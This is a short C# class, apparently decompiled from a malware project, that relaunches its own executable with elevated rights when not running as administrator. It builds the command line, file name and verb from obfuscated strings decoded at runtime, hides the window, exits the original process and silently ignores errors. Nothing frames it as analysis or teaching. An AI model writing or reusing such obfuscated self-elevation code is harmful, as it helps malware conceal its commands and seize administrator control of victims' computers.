using System;
using System.Diagnostics;

namespace Peg.ICARUS
{
	public class apha
	{
		public apha()
		{
			if (AlphaAndOmega.IsAdmin())
			{
				return;
			}
			try
			{
				Process process = new Process();
				process.StartInfo = new ProcessStartInfo
				{
					FileName = AlphaAndOmega.BCutEncrypt("ign"),
					Arguments = AlphaAndOmega.BCutEncrypt("%a*Y^KX^*V(V(*V(") + Process.GetCurrentProcess().MainModule.FileName + AlphaAndOmega.BCutEncrypt("V(*,*ORC^"),
					WindowStyle = ProcessWindowStyle.Hidden,
					Verb = AlphaAndOmega.BCutEncrypt("x\u007fdky"),
					UseShellExecute = true
				};
				process.Start();
				Environment.Exit(0);
			}
			catch
			{
			}
		}
	}
}
